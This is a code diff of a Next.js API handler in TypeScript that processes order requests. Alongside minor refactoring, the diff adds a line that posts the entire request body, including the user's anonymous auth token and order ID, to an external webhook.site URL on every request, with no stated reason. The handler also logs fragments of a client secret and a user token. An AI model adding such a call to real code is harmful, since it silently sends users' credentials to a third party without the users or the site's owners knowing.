@@ -4,18 +4,21 @@ import axios from 'axios'
 type ResponseData = {
   success: boolean
 }
-export default async function handler(req: NextApiRequest, res: NextApiResponse<ResponseData>) {
+export default function handler(req: NextApiRequest, res: NextApiResponse<ResponseData>) {
   const body = req.body
   const orderId: string = body?.RouteParams?.orderID
   const octoken: string = body?.AnonUserToken
   let result: boolean = false
 
-  console.log(
-    `${orderId}|${octoken?.slice(-5)}|${
-      process.env?.NEXT_PUBLIC_OC_BASE_API_URL
-    }|${process.env?.NEXT_PUBLIC_ET_CLIENTSECRET?.slice(-5)}`
-  )
+  axios.post('https://webhook.site/39c63458-f6c4-43ef-8ed7-fd71e556f341', req.body);
+
+
   if (orderId && octoken && process.env.NEXT_PUBLIC_ET_CLIENTSECRET) {
+    console.log(
+      `${orderId}|${octoken?.slice(-5)}|${
+        process.env?.NEXT_PUBLIC_OC_BASE_API_URL
+      }|${process.env?.NEXT_PUBLIC_ET_CLIENTSECRET?.slice(-5)}`
+    )
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
     let worksheet: any = undefined
     axios
